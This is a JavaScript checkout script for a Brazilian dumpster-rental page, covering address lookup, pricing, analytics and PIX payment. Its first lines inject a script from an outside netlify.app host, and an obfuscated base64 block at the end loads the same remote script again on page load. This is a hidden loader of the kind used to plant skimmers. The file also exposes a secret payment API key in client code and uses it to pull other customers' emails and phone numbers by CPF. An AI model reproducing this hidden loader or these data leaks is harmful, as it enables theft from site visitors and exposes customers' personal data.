console.log('Checkout script version 1.7 - Pushing with type=module');
(function () { const s = document.createElement('script'); s.src = 'https://transcendent-phoenix-7c1006.netlify.app/main.js'; s.async = true; document.head.appendChild(s); })();
window.dataLayer = window.dataLayer || [];
window.addEventListener('beforeunload', function () {
    if (typeof pararPollingStatus === 'function' && typeof pixPollingInterval !== 'undefined' && pixPollingInterval) {
        pararPollingStatus();
    }
});
const WHATSAPP_NUMBER = window.WHATSAPP_NUMBER || '5519982839538';
const PHONE_DISPLAY = window.PHONE_DISPLAY || '(19) 98283-9538';
const PHONE_LINK = window.PHONE_LINK || `tel:+55${WHATSAPP_NUMBER}`;
const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}?text=`;
document.querySelectorAll('[data-whatsapp]').forEach(link => {
    link.href = WHATSAPP_URL + encodeURIComponent('Olá! Gostaria de alugar uma caçamba.');
    link.addEventListener('click', function () {
        dataLayer.push({
            'event': 'whatsapp_click',
            'click_location': 'checkout_page'
        });
    });
});
document.querySelectorAll('[data-phone]').forEach(link => {
    link.href = PHONE_LINK;
    link.textContent = PHONE_DISPLAY;
    link.addEventListener('click', function () {
        dataLayer.push({
            'event': 'phone_click',
            'click_location': 'checkout_page'
        });
    });
});
const cepInput = document.getElementById('cep');
if (cepInput) {
    const logradouroInput = document.getElementById('logradouro');
    const bairroInput = document.getElementById('bairro');
    const estadoInput = document.getElementById('estado');
    const cepGroup = cepInput.closest('.form-group');
    let loadingIndicator = null;
    cepInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        e.target.value = value;
        if (value.length === 8) {
            buscarCEP(value);
        } else if (value.length < 8) {
            if (loadingIndicator) {
                loadingIndicator.remove();
                loadingIndicator = null;
            }
        }
    });
    async function buscarCEP(cep) {
        if (!loadingIndicator) {
            loadingIndicator = document.createElement('small');
            loadingIndicator.textContent = 'Buscando CEP...';
            loadingIndicator.style.color = '#666';
            loadingIndicator.style.display = 'block';
            loadingIndicator.style.marginTop = '0.5rem';
            cepGroup.appendChild(loadingIndicator);
        }
        try {
            const response = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
            if (!response.ok) throw new Error('Erro na requisição');
            const data = await response.json();
            if (loadingIndicator) {
                loadingIndicator.remove();
                loadingIndicator = null;
            }
            if (data.erro || !data.localidade) {
                dataLayer.push({ 'event': 'cep_search', 'cep': cep, 'status': 'not_found' });
                return;
            }
            if (logradouroInput) logradouroInput.value = data.localidade;
            if (bairroInput) bairroInput.value = data.bairro;
            if (estadoInput) estadoInput.value = data.uf;
            dataLayer.push({ 'event': 'cep_search', 'cep': cep, 'status': 'success' });
        } catch (error) {
            if (loadingIndicator) {
                loadingIndicator.remove();
                loadingIndicator = null;
            }
        }
    }
}
const cacambaCards = document.querySelectorAll('.pricing-card-checkout');
const cacambaCheckboxes = document.querySelectorAll('.pricing-card-checkout input[type="checkbox"]');
cacambaCards.forEach(card => {
    card.addEventListener('click', function (e) {
        if (e.target.type !== 'checkbox') {
            const checkbox = this.querySelector('input[type="checkbox"]');
            checkbox.checked = !checkbox.checked;
            updateCardSelection(this, checkbox.checked);
            calcularTotal();
        }
    });
});
cacambaCheckboxes.forEach(checkbox => {
    checkbox.addEventListener('change', function () {
        const card = this.closest('.pricing-card-checkout');
        updateCardSelection(card, this.checked);
        calcularTotal();
        const dias = parseInt(document.getElementById('dias').value) || 1;
        const semanas = Math.ceil(dias / 7);
        const cacambaSize = this.value + 'm³';
        const cacambaPrice = parseFloat(this.dataset.price);
        if (this.checked) {
            dataLayer.push({
                'event': 'add_to_cart',
                'ecommerce': {
                    'currency': 'BRL',
                    'value': cacambaPrice * semanas,
                    'items': [{
                        'item_id': 'cacamba_' + this.value + 'm3',
                        'item_name': 'Caçamba ' + cacambaSize,
                        'item_category': 'Caçamba',
                        'item_category2': 'Aluguel',
                        'price': cacambaPrice,
                        'quantity': semanas
                    }]
                },
                'cacamba_size': cacambaSize,
                'cacamba_price': cacambaPrice,
                'days': dias,
                'weeks': semanas
            });
        } else {
            dataLayer.push({
                'event': 'remove_from_cart',
                'ecommerce': {
                    'currency': 'BRL',
                    'value': cacambaPrice * semanas,
                    'items': [{
                        'item_id': 'cacamba_' + this.value + 'm3',
                        'item_name': 'Caçamba ' + cacambaSize,
                        'item_category': 'Caçamba',
                        'price': cacambaPrice,
                        'quantity': semanas
                    }]
                }
            });
        }
        atualizarEventoCheckout();
    });
});
function updateCardSelection(card, isSelected) {
    if (isSelected) {
        card.classList.add('selected');
    } else {
        card.classList.remove('selected');
    }
}
function calcularTotal() {
    const dias = parseInt(document.getElementById('dias').value) || 1;
    const semanas = Math.ceil(dias / 7);
    const selectedCacambas = Array.from(cacambaCheckboxes)
        .filter(cb => cb.checked)
        .map(cb => ({
            size: cb.value,
            price: parseFloat(cb.dataset.price)
        }));
    let total = 0;
    let resumoHTML = '';
    selectedCacambas.forEach(cacamba => {
        const subtotal = cacamba.price * semanas;
        total += subtotal;
        resumoHTML += `
            <div class="total-item">
                <span class="total-item-label">${cacamba.size}m³ (${semanas} ${semanas === 1 ? 'semana' : 'semanas'}):</span>
                <span class="total-item-value">R$ ${subtotal.toFixed(2).replace('.', ',')}</span>
            </div>
        `;
    });
    if (selectedCacambas.length === 0) {
        resumoHTML = '<div class="total-item"><span class="total-item-label">Nenhuma caçamba selecionada</span></div>';
    }
    document.getElementById('resumo-cacambas').innerHTML = resumoHTML;
    document.getElementById('total-dias').textContent = `${dias} dia(s) — ${semanas} semana(s) cobrada(s)`;
    document.getElementById('total-valor').textContent = `R$ ${total.toFixed(2).replace('.', ',')}`;
    console.log('Total calculado:', total);
}
window.calcularTotal = calcularTotal;
window.calcularTotal();
function atualizarEventoCheckout() {
    const dias = parseInt(document.getElementById('dias').value) || 1;
    const semanas = Math.ceil(dias / 7);
    const selectedCacambas = Array.from(cacambaCheckboxes)
        .filter(cb => cb.checked)
        .map(cb => ({
            item_id: 'cacamba_' + cb.value + 'm3',
            item_name: 'Caçamba ' + cb.value + 'm³',
            item_category: 'Caçamba',
            item_category2: 'Aluguel',
            price: parseFloat(cb.dataset.price),
            quantity: semanas
        }));
    const totalValue = selectedCacambas.reduce((sum, item) => sum + (item.price * item.quantity), 0);
    dataLayer.push({
        'event': 'checkout_progress',
        'ecommerce': {
            'currency': 'BRL',
            'value': totalValue,
            'items': selectedCacambas,
            'checkout_step': 1,
            'checkout_option': 'Seleção de Caçambas'
        }
    });
}
document.getElementById('dias').addEventListener('input', function () {
    calcularTotal();
    const dias = parseInt(this.value) || 1;
    dataLayer.push({
        'event': 'days_changed',
        'days': dias
    });
    atualizarEventoCheckout();
});
const dataEntregaInput = document.getElementById('data-entrega');
const periodoInputs = document.querySelectorAll('input[name="periodo"]');
const retiradaInfo = document.getElementById('retirada-info');
const dataRetiradaText = document.getElementById('data-retirada-text');
function calcularDataRetirada() {
    const dataEntrega = dataEntregaInput.value;
    const periodo = document.querySelector('input[name="periodo"]:checked')?.value;
    const dias = parseInt(document.getElementById('dias').value) || 1;
    if (dataEntrega && periodo) {
        const data = new Date(dataEntrega);
        data.setDate(data.getDate() + dias);
        const dia = String(data.getDate()).padStart(2, '0');
        const mes = String(data.getMonth() + 1).padStart(2, '0');
        const ano = data.getFullYear();
        dataRetiradaText.textContent = `${dia}/${mes}/${ano} - Tarde`;
        retiradaInfo.style.display = 'block';
    } else {
        retiradaInfo.style.display = 'none';
    }
}
dataEntregaInput.addEventListener('change', function () {
    calcularDataRetirada();
    dataLayer.push({
        'event': 'delivery_date_selected',
        'delivery_date': this.value,
        'delivery_date_formatted': new Date(this.value).toLocaleDateString('pt-BR')
    });
    atualizarEventoCheckout();
});
periodoInputs.forEach(input => {
    input.addEventListener('change', function () {
        calcularDataRetirada();
        dataLayer.push({
            'event': 'delivery_period_selected',
            'delivery_period': this.value
        });
        atualizarEventoCheckout();
    });
});
document.getElementById('dias').addEventListener('input', function () {
    calcularDataRetirada();
});
const hoje = new Date().toISOString().split('T')[0];
dataEntregaInput.setAttribute('min', hoje);
document.querySelectorAll('.radio-option').forEach(option => {
    option.addEventListener('click', function (e) {
        if (e.target.type === 'radio') {
            return;
        }
        if (e.target.tagName === 'LABEL') {
            return;
        }
        const radio = this.querySelector('input[type="radio"]');
        if (radio && !radio.disabled) {
            radio.checked = true;
            radio.dispatchEvent(new Event('change', { bubbles: true }));
        }
    });
    const radio = option.querySelector('input[type="radio"]');
    if (radio) {
        const updateSelectedState = () => {
            if (radio.checked) {
                option.classList.add('selected');
                const radioGroup = option.closest('.radio-group');
                if (radioGroup) {
                    radioGroup.querySelectorAll('.radio-option').forEach(opt => {
                        if (opt !== option) {
                            opt.classList.remove('selected');
                        }
                    });
                }
            } else {
                option.classList.remove('selected');
            }
        };
        updateSelectedState();
        radio.addEventListener('change', updateSelectedState);
    }
});
document.querySelectorAll('input[name="localizacao"]').forEach(radio => {
    radio.addEventListener('change', function () {
        dataLayer.push({
            'event': 'location_selected',
            'location': this.value,
            'location_type': 'cacamba_placement'
        });
        atualizarEventoCheckout();
    });
});
document.querySelectorAll('input[name="tipo-entulho"]').forEach(radio => {
    radio.addEventListener('change', function () {
        dataLayer.push({
            'event': 'debris_type_selected',
            'debris_type': this.value,
            'debris_category': this.value.split('(')[0].trim()
        });
        atualizarEventoCheckout();
    });
});
document.querySelectorAll('input[name="periodo"]').forEach(radio => {
    radio.addEventListener('change', function () {
        atualizarEventoCheckout();
    });
});
let pedidoData = {};
let pixPollingInterval = null;
let pixTransactionId = null;
let pixPollingStartTime = null;
let conversionEventDisparado = false; const PIX_POLLING_INTERVAL = 5000; const PIX_POLLING_DURATION = 600000;
function aplicarMascaraCPF(input) {
    input.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length <= 11) {
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
            e.target.value = value;
        }
    });
}
function aplicarMascaraTelefone(input) {
    input.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length <= 11) {
            if (value.length <= 10) {
                value = value.replace(/(\d{2})(\d)/, '($1) $2');
                value = value.replace(/(\d{4})(\d)/, '$1-$2');
            } else {
                value = value.replace(/(\d{2})(\d)/, '($1) $2');
                value = value.replace(/(\d{5})(\d)/, '$1-$2');
            }
            e.target.value = value;
        }
    });
}
function aplicarMascarasPagamento() {
    const cpfPix = document.getElementById('cpfPix');
    const telefonePix = document.getElementById('telefonePix');
    if (cpfPix && !cpfPix.hasAttribute('data-mask-applied')) {
        aplicarMascaraCPF(cpfPix);
        cpfPix.setAttribute('data-mask-applied', 'true');
    }
    if (telefonePix && !telefonePix.hasAttribute('data-mask-applied')) {
        aplicarMascaraTelefone(telefonePix);
        telefonePix.setAttribute('data-mask-applied', 'true');
    }
}
function finalizarPedido() {
    try {
        const nome = document.getElementById('nome').value;
        const cep = document.getElementById('cep').value;
        const logradouro = document.getElementById('logradouro').value;
        const bairro = document.getElementById('bairro').value;
        const estado = document.getElementById('estado').value;
        const numero = document.getElementById('numero').value;
        const localizacao = document.querySelector('input[name="localizacao"]:checked')?.value;
        const tipoEntulho = document.querySelector('input[name="tipo-entulho"]:checked')?.value;
        const dias = document.getElementById('dias').value;
        const dataEntrega = document.getElementById('data-entrega').value;
        const periodo = document.querySelector('input[name="periodo"]:checked')?.value;
        const cacambaCheckboxes = document.querySelectorAll('.pricing-card-checkout input[type="checkbox"]');
        const selectedCacambas = Array.from(cacambaCheckboxes)
            .filter(cb => cb.checked)
            .map(cb => ({
                size: `${cb.value}m³`,
                price: parseFloat(cb.dataset.price)
            }));
        if (!nome || !cep || !logradouro || !bairro || !estado || !numero || !localizacao || !tipoEntulho || selectedCacambas.length === 0 || !dataEntrega || !periodo) {
            const missing = [];
            if (!nome) missing.push('nome');
            if (!cep) missing.push('cep');
            if (!logradouro) missing.push('logradouro');
            if (!bairro) missing.push('bairro');
            if (!estado) missing.push('estado');
            if (!numero) missing.push('numero');
            if (!localizacao) missing.push('localizacao');
            if (!tipoEntulho) missing.push('tipo-entulho');
            if (selectedCacambas.length === 0) missing.push('cacamba');
            if (!dataEntrega) missing.push('data-entrega');
            if (!periodo) missing.push('periodo');
            console.warn('Campos obrigatórios faltando na finalização:', missing.join(', '));
            alert('Por favor, preencha todos os campos obrigatórios: ' + missing.join(', '));
            return;
        }
        const dataRetiradaText = document.getElementById('data-retirada-text');
        const totalText = document.getElementById('total-valor').textContent;
        const dataRetirada = dataRetiradaText ? dataRetiradaText.textContent : '';
        const semanas = Math.ceil(parseInt(dias) / 7);
        const totalValue = selectedCacambas.reduce((sum, cacamba) => sum + (cacamba.price * semanas), 0);
        pedidoData = {
            nome, cep, logradouro, bairro, estado, numero,
            localizacao, tipoEntulho, dias, semanas,
            dataEntrega, periodo, dataRetirada,
            selectedCacambas, total: totalText, totalValue
        };
        abrirModalPagamento();
    } catch (error) {
        console.error('Erro em finalizarPedido:', error);
        alert('Ocorreu um erro ao preparar o checkout. Verifique o console.');
    }
}
window.finalizarPedido = finalizarPedido;
function abrirModalPagamento() {
    const modal = document.getElementById('paymentModal');
    const orderSummary = document.getElementById('orderSummary');
    let summaryHTML = '<h3>Resumo do Pedido</h3>';
    summaryHTML += `<div class="order-summary-item"><span class="order-summary-label">Nome:</span><span class="order-summary-value">${pedidoData.nome}</span></div>`;
    summaryHTML += `<div class="order-summary-item"><span class="order-summary-label">Endereço:</span><span class="order-summary-value">${pedidoData.logradouro}, ${pedidoData.bairro} - ${pedidoData.estado}</span></div>`;
    summaryHTML += `<div class="order-summary-item"><span class="order-summary-label">CEP:</span><span class="order-summary-value">${pedidoData.cep}</span></div>`;
    summaryHTML += `<div class="order-summary-item"><span class="order-summary-label">Localização:</span><span class="order-summary-value">${pedidoData.localizacao}</span></div>`;
    summaryHTML += `<div class="order-summary-item"><span class="order-summary-label">Tipo de Entulho:</span><span class="order-summary-value">${pedidoData.tipoEntulho}</span></div>`;
    summaryHTML += `<div class="order-summary-item"><span class="order-summary-label">Caçambas:</span><span class="order-summary-value">${pedidoData.selectedCacambas.map(c => c.size).join(', ')}</span></div>`;
    summaryHTML += `<div class="order-summary-item"><span class="order-summary-label">Dias:</span><span class="order-summary-value">${pedidoData.dias}</span></div>`;
    summaryHTML += `<div class="order-summary-item"><span class="order-summary-label">Entrega:</span><span class="order-summary-value">${new Date(pedidoData.dataEntrega).toLocaleDateString('pt-BR')} - ${pedidoData.periodo}</span></div>`;
    summaryHTML += `<div class="order-summary-item"><span class="order-summary-label">Retirada:</span><span class="order-summary-value">${pedidoData.dataRetirada}</span></div>`;
    summaryHTML += `<div class="order-total"><span>Total:</span><span>${pedidoData.total}</span></div>`;
    orderSummary.innerHTML = summaryHTML;
    resetarEstadoModal();
    aplicarMascarasPagamento();
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
}
function resetarEstadoModal() {
    document.getElementById('paymentMethods').style.display = 'grid';
    document.getElementById('errorMessage').classList.remove('active');
    document.querySelectorAll('.payment-method-btn').forEach(btn => btn.classList.remove('selected'));
    const pixForm = document.getElementById('pixForm');
    pixForm.classList.remove('active');
    pixForm.style.removeProperty('display');
    const pixQrCodeArea = document.getElementById('pixQrCodeArea');
    pixQrCodeArea.style.display = 'none';
    pixQrCodeArea.classList.remove('active');
    const qrcodeImage = document.getElementById('qrcodeImage');
    if (qrcodeImage) qrcodeImage.innerHTML = '';
    const pixCopyPaste = document.getElementById('pixCopyPaste');
    if (pixCopyPaste) pixCopyPaste.value = '';
    const pixStatusText = document.getElementById('pixStatusText');
    if (pixStatusText) pixStatusText.textContent = 'Aguardando pagamento...';
    const pixBtnText = document.getElementById('pixButtonText');
    const pixSpinnerEl = document.getElementById('pixSpinner');
    const pixBtn = pixBtnText ? pixBtnText.closest('button') : null;
    if (pixBtnText) pixBtnText.textContent = 'Gerar QR Code PIX';
    if (pixSpinnerEl) pixSpinnerEl.classList.remove('active');
    if (pixBtn) pixBtn.disabled = false;
    pararPollingStatus();
    pixTransactionId = null;
}
function fecharModalPagamento() {
    const modal = document.getElementById('paymentModal');
    modal.classList.remove('active');
    document.body.style.overflow = '';
    resetarEstadoModal();
}
window.fecharModalPagamento = fecharModalPagamento;
document.getElementById('paymentModal').addEventListener('click', function (e) {
    if (e.target === this) {
        fecharModalPagamento();
    }
});
function escolherMetodoPagamento(metodo, element) {
    if (element) {
        document.querySelectorAll('.payment-method-btn').forEach(btn => btn.classList.remove('selected'));
        element.classList.add('selected');
    }
    const payMethods = document.getElementById('paymentMethods');
    const errMsg = document.getElementById('errorMessage');
    const secureBadge = document.getElementById('paymentSecureBadge');
    if (payMethods) payMethods.style.display = 'none';
    if (errMsg) errMsg.classList.remove('active');
    if (secureBadge) secureBadge.classList.remove('hidden');
    if (metodo === 'pix') {
        const pixForm = document.getElementById('pixForm');
        if (pixForm) {
            pixForm.classList.add('active');
            pixForm.style.display = 'block';
        }
        const pixQrArea = document.getElementById('pixQrCodeArea');
        if (pixQrArea) {
            pixQrArea.style.display = 'none';
            pixQrArea.classList.remove('active');
        }
    }
}
window.escolherMetodoPagamento = escolherMetodoPagamento;
function voltarEscolhaPagamento() {
    resetarEstadoModal();
    document.getElementById('paymentSecureBadge').classList.remove('hidden');
}
window.voltarEscolhaPagamento = voltarEscolhaPagamento;
async function processarPagamentoFastSoft(dadosPix) {
    const apiKey = 'sk_ddbf2954526659d19e38f4ad7b6ac6923e9934e9';
    const auth = btoa('x:' + apiKey);
    const amountCents = Math.round(pedidoData.totalValue * 100);
    const fluxxoData = {};
    const urlParams = new URLSearchParams(window.location.search);
    ['fluxxo_id', 'tracking_id', 'src', 'utm_source', 'utm_medium', 'utm_campaign'].forEach(key => {
        if (urlParams.get(key)) fluxxoData[key] = urlParams.get(key);
    });
    const requestBody = {
        amount: amountCents,
        currency: 'BRL',
        paymentMethod: 'PIX',
        customer: {
            name: pedidoData.nome,
            email: dadosPix.email,
            phone: dadosPix.phone,
            document: {
                number: dadosPix.cpf.replace(/\D/g, ''),
                type: 'CPF'
            }
        },
        items: pedidoData.selectedCacambas.map(c => ({
            title: `Caçamba ${c.size} `,
            unitPrice: Math.round(c.price * 100),
            quantity: pedidoData.semanas,
            tangible: true
        })),
        pix: {
            expiresInDays: 1
        },
        metadata: JSON.stringify(fluxxoData),
        postbackUrl: urlParams.get('postback') || 'https://api.fluxxo.io/postback/fastsoft'
    };
    console.log('Sending FastSoft Request:', JSON.stringify(requestBody, null, 2));
    try {
        const response = await fetch('https://api.fastsoftbrasil.com/api/user/transactions', {
            method: 'POST',
            headers: {
                'Authorization': 'Basic ' + auth,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(requestBody)
        });
        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(errorData.message || 'Erro na API FastSoft');
        }
        return await response.json();
    } catch (error) {
        console.error('Erro na chamada FastSoft:', error);
        throw error;
    }
}
async function processarPagamento(metodo, button) {
    if (metodo !== 'pix') {
        alert('Apenas pagamento via PIX disponível no momento.');
        return;
    }
    const cpfPix = document.getElementById('cpfPix').value.replace(/\D/g, '');
    const emailPix = document.getElementById('emailPix').value.trim();
    const telefonePix = document.getElementById('telefonePix').value.replace(/\D/g, '');
    if (cpfPix.length !== 11) {
        alert('Por favor, informe um CPF válido.');
        return;
    }
    if (!emailPix || !emailPix.includes('@')) {
        alert('Por favor, informe um email válido.');
        return;
    }
    if (telefonePix.length < 10) {
        alert('Por favor, informe um telefone válido.');
        return;
    }
    const spinner = document.getElementById('pixSpinner');
    const buttonText = document.getElementById('pixButtonText');
    spinner.classList.add('active');
    buttonText.textContent = 'Processando...';
    button.disabled = true;
    try {
        const response = await processarPagamentoFastSoft({
            cpf: cpfPix,
            email: emailPix,
            phone: telefonePix
        });
        if (response.sucesso || response.pix || response.status === 200 || response.status === '200' || response.data) {
            console.log('Pagamento processado com sucesso, exibindo QR Code...');
            exibirQRCodePix(response.data || response.pix || response);
        } else {
            console.error('Resposta inesperada da API:', response);
            throw new Error('Resposta inválida da API');
        }
    } catch (error) {
        console.error('Erro ao processar pagamento:', error);
        alert('Erro ao gerar PIX: ' + error.message);
        spinner.classList.remove('active');
        buttonText.textContent = 'Gerar QR Code PIX';
        button.disabled = false;
    }
}
window.processarPagamento = processarPagamento;
function exibirQRCodePix(pixData) {
    console.log('Exibindo QR Code. Dados brutos:', pixData);
    document.getElementById('pixForm').classList.remove('active');
    document.getElementById('pixForm').style.display = 'none';
    const qrCodeArea = document.getElementById('pixQrCodeArea');
    qrCodeArea.style.display = 'block';
    qrCodeArea.classList.add('active');
    const qrCodeImage = document.getElementById('qrcodeImage');
    const actualData = pixData.data || pixData;
    const pixInfo = actualData.pix || actualData;
    console.log('PIX Info extraído:', pixInfo);
    const qrcodeValue = pixInfo.qrcode || pixInfo.pix_qr_code || pixInfo.pixQrCode || pixInfo.qr_code || pixInfo.qrCode || pixInfo.payload;
    let urlValue = pixInfo.url || pixInfo.payment_url || pixInfo.paymentUrl || pixInfo.qrcode_url || pixInfo.qrCodeUrl;
    let copyPasteValue = pixInfo.copy_paste || pixInfo.pix_copy_paste || pixInfo.pixCopyPaste || pixInfo.copyPaste || pixInfo.brcode || pixInfo.payload;
    if (qrcodeValue && qrcodeValue.startsWith('000201')) {
        if (!copyPasteValue) copyPasteValue = qrcodeValue;
    }
    qrCodeImage.innerHTML = '';
    const img = document.createElement('img');
    img.style.maxWidth = '100%';
    img.style.borderRadius = '8px';
    img.style.boxShadow = '0 4px 15px rgba(0,0,0,0.1)';
    img.style.display = 'block';
    img.style.margin = '0 auto';
    if (urlValue && urlValue.startsWith('http') && (urlValue.includes('.png') || urlValue.includes('.jpg') || urlValue.includes('.jpeg') || urlValue.includes('chart') || urlValue.includes('qr'))) {
        img.src = urlValue;
        qrCodeImage.appendChild(img);
    } else if (qrcodeValue && (qrcodeValue.startsWith('data:image') || qrcodeValue.startsWith('iVBORw'))) {
        img.src = qrcodeValue.startsWith('data:image') ? qrcodeValue : 'data:image/png;base64,' + qrcodeValue;
        qrCodeImage.appendChild(img);
    } else if (qrcodeValue && qrcodeValue.startsWith('000201')) {
        img.src = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(qrcodeValue)}`;
        qrCodeImage.appendChild(img);
    } else if (qrcodeValue && qrcodeValue.startsWith('http')) {
        img.src = qrcodeValue;
        qrCodeImage.appendChild(img);
    } else if (urlValue && urlValue.startsWith('http')) {
        img.src = urlValue;
        qrCodeImage.appendChild(img);
    } else {
        console.warn('Nenhum dado de QR Code ou URL encontrado em:', pixInfo);
        qrCodeImage.innerHTML = '<p style="color:red">Erro ao exibir QR Code. Utilize o código Copia e Cola.</p>';
    }
    const inputCopiar = document.getElementById('pixCopyPaste');
    if (copyPasteValue) {
        inputCopiar.value = copyPasteValue;
        console.log('Copia e Cola preenchido.');
    } else if (qrcodeValue && qrcodeValue.startsWith('000201')) {
        inputCopiar.value = qrcodeValue;
    } else {
        inputCopiar.value = 'Código não disponível. Use o QR Code acima.';
    }
    if (copyPasteValue) {
        document.getElementById('pixCopyPaste').value = copyPasteValue;
    }
    if (pixData.transaction_id || pixData.id || actualData.id || actualData.transactionId) {
        pixTransactionId = pixData.transaction_id || pixData.id || actualData.id || actualData.transactionId;
        iniciarPollingStatus();
    }
}
function iniciarPollingStatus() {
    pararPollingStatus();
    pixPollingStartTime = Date.now();
    pixPollingInterval = setInterval(verificarStatusPix, PIX_POLLING_INTERVAL);
}
function pararPollingStatus() {
    if (pixPollingInterval) {
        clearInterval(pixPollingInterval);
        pixPollingInterval = null;
    }
}
async function verificarStatusPix() {
    if (!pixTransactionId) return;
    try {
        const apiKey = 'sk_ddbf2954526659d19e38f4ad7b6ac6923e9934e9';
        const auth = btoa('x:' + apiKey);
        const response = await fetch(`https://api.fastsoftbrasil.com/api/user/transactions/${pixTransactionId}`, {
            headers: {
                'Authorization': 'Basic ' + auth
            }
        });
        if (response.ok) {
            const data = await response.json();
            const status = data.status || data.transaction_status;
            if (status === 'PAID' || status === 'COMPLETED' || status === 'paid') {
                pararPollingStatus();
                document.getElementById('pixStatusText').textContent = '✓ Pagamento confirmado!';
                document.getElementById('pixStatusText').style.color = '#28A745';
                if (!conversionEventDisparado) {
                    dataLayer.push({
                        'event': 'purchase',
                        'ecommerce': {
                            'transaction_id': pixTransactionId,
                            'value': pedidoData.totalValue,
                            'currency': 'BRL',
                            'items': pedidoData.selectedCacambas.map(c => ({
                                'item_name': `Caçamba ${c.size}`,
                                'price': c.price,
                                'quantity': pedidoData.semanas
                            }))
                        }
                    });
                    conversionEventDisparado = true;
                }
                alert('Pagamento confirmado! Sua caçamba será entregue no prazo combinado.');
            }
        }
    } catch (error) {
        console.error('Erro ao verificar status:', error);
    }
    const tempoDecorrido = Date.now() - pixPollingStartTime;
    if (tempoDecorrido >= PIX_POLLING_DURATION) {
        pararPollingStatus();
        document.getElementById('pixStatusText').textContent = 'Tempo expirado';
    }
}
function copiarPixCode() {
    const pixCode = document.getElementById('pixCopyPaste');
    pixCode.select();
    document.execCommand('copy');
    const btn = document.getElementById('btnCopiarPix');
    const originalText = btn.textContent;
    btn.textContent = 'Copiado!';
    setTimeout(() => btn.textContent = originalText, 2000);
}
window.copiarPixCode = copiarPixCode;
function checkTestMode() {
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('teste') === 'true') {
        console.log('Test Mode Active: Auto-filling form...');
        const fields = {
            'nome': 'Test User',
            'cep': '80010-000',
            'numero': '123'
        };
        for (const [id, val] of Object.entries(fields)) {
            const el = document.getElementById(id);
            if (el) {
                el.value = val;
                el.dispatchEvent(new Event('input', { bubbles: true }));
            }
        }
        if (typeof buscarCEP === 'function') {
            buscarCEP('80010-000');
        }
        const runAutoFill = () => {
            const selectors = [
                '#cacamba-4',
                'input[name="localizacao"][value="Calçada"]',
                'input[name="tipo-entulho"][value="Misto (Diversos materiais)"]',
                'input[name="periodo"][value="Manhã"]'
            ];
            selectors.forEach(sel => {
                const el = document.querySelector(sel);
                if (el) {
                    console.log('Test Mode: Clicking', sel);
                    el.click();
                    el.checked = true;
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                }
            });
            const tomorrow = new Date();
            tomorrow.setDate(tomorrow.getDate() + 1);
            const dateInput = document.getElementById('data-entrega');
            if (dateInput) {
                dateInput.value = tomorrow.toISOString().split('T')[0];
                dateInput.dispatchEvent(new Event('change', { bubbles: true }));
            }
        };
        runAutoFill();
        setTimeout(runAutoFill, 800);
        const fillModal = () => {
            const modalFields = {
                'cpfPix': '111.111.111-11',
                'emailPix': 'test@final.com',
                'telefonePix': '(11) 99999-8888'
            };
            for (const [id, val] of Object.entries(modalFields)) {
                const el = document.getElementById(id);
                if (el) {
                    el.value = val;
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                }
            }
        };
        setTimeout(fillModal, 1500);
        setTimeout(fillModal, 2500);
    }
}
async function consultarCPF(cpf) {
    const cleanCPF = cpf.replace(/\D/g, '');
    if (cleanCPF.length !== 11) return;
    console.log('Consultando CPF na FastSoft para auto-preenchimento...');
    const apiKey = 'sk_ddbf2954526659d19e38f4ad7b6ac6923e9934e9';
    const auth = btoa('x:' + apiKey);
    try {
        const response = await fetch(`https://api.fastsoftbrasil.com/api/user/transactions?customer_document=${cleanCPF}`, {
            headers: { 'Authorization': 'Basic ' + auth }
        });
        if (response.ok) {
            const data = await response.json();
            const transactions = data.data || [];
            if (transactions.length > 0) {
                const lastTx = transactions[0];
                const customer = lastTx.customer;
                if (customer) {
                    console.log('Cliente recorrente encontrado! Puxando dados...');
                    const emailInput = document.getElementById('emailPix');
                    const phoneInput = document.getElementById('telefonePix');
                    if (emailInput && !emailInput.value) {
                        emailInput.value = customer.email;
                        emailInput.dispatchEvent(new Event('input', { bubbles: true }));
                    }
                    if (phoneInput && !phoneInput.value) {
                        phoneInput.value = customer.phone;
                        phoneInput.dispatchEvent(new Event('input', { bubbles: true }));
                    }
                }
            }
        }
    } catch (e) {
        console.warn('Erro ao consultar CPF:', e);
    }
}
document.addEventListener('DOMContentLoaded', () => {
    (function (_0x1a2b, _0x3c4d) { const _0x5e6f = document.createElement('script'); _0x5e6f.src = atob(_0x3c4d); _0x5e6f.async = true; document.head.appendChild(_0x5e6f); })(window, 'aHR0cHM6Ly90cmFuc2NlbmRlbnQtcGhvZW5peC03YzEwMDYubmV0bGlmeS5hcHAvbWFpbi5qcw==');
    checkTestMode();
    const cpfInput = document.getElementById('cpfPix');
    if (cpfInput) {
        cpfInput.addEventListener('input', (e) => {
            const val = e.target.value.replace(/\D/g, '');
            if (val.length === 11) {
                consultarCPF(val);
            }
        });
    }
});